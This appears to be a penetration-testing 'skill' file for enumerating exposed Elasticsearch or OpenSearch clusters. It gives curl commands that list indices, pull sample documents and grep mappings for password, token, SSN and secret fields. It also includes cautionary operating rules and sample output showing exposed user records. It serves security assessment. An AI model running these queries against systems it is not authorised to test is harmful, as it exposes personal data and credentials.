---
name: elasticsearch-opensearch
description: Elasticsearch and OpenSearch index enumeration
version: 1.0.0
phase: enum
category: infrastructure
tags: [elasticsearch, opensearch, search, database]
tools: [curl]
difficulty: basic
opsec_level: medium
time_estimate: 30s
severity_if_found: critical
related_skills:
  - docker-api
  - kubernetes-api
mitre_attack:
  - T1530
  - T1005
---

## When to Use

Use this skill when you find an Elasticsearch or OpenSearch instance exposed
on port 9200/9300 without authentication.

## Prerequisites

- curl
- jq (for JSON parsing)

## Procedure

```bash
# Step 1: Check if Elasticsearch is accessible
curl -sk https://TARGET:9200/
curl -sk https://TARGET:9200/_cluster/health?pretty

# Step 2: List all indices
curl -sk https://TARGET:9200/_cat/indices?v | sort -k3

# Step 3: Get index mappings (find sensitive fields)
curl -sk https://TARGET:9200/_mapping?pretty | jq 'keys'

# Step 4: Count documents in each index
curl -sk "https://TARGET:9200/_cat/indices?v&h=index,docs.count,store.size" | sort -k2 -n -r

# Step 5: Sample documents from interesting indices
curl -sk "https://TARGET:9200/INDEX_NAME/_search?size=1&pretty" | jq '.hits.hits[0]._source'

# Step 6: Check for sensitive field names
curl -sk https://TARGET:9200/_mapping?pretty | jq '.[] | .mappings.properties | keys[]' | sort -u | grep -iE "pass|email|ssn|token|key|secret"

# Step 7: List all aliases
curl -sk https://TARGET:9200/_cat/aliases?v

# Step 8: Check cluster settings
curl -sk https://TARGET:9200/_cluster/settings?pretty | jq '.persistent'
```

## OPSEC Rules

- Do NOT delete or modify any indices
- Do NOT attempt to write documents
- Do NOT run aggregation queries (resource-intensive)
- Limit sampling to 1-5 documents per index
- Log all requests for audit trail

## Verification

- Confirm cluster health returns `green` or `yellow`
- Verify index listing shows real data
- Check if authentication is required

## Pitfalls

- Port 9300 is the transport port (not HTTP)
- Some instances use nginx reverse proxy on 443
- Index names may be random strings
- Mapping may span multiple levels of nested objects

## Output Format

```
[ES]      Cluster: production — health: GREEN — 8 indices
[ES]      users — 142,000 docs — 23MB
[ES]      logs — 1,200,000 docs — 450MB
[SECRET]  users field: password_hash, email, api_key
[CRITICAL] Unauthenticated access — 142k user records exposed
```
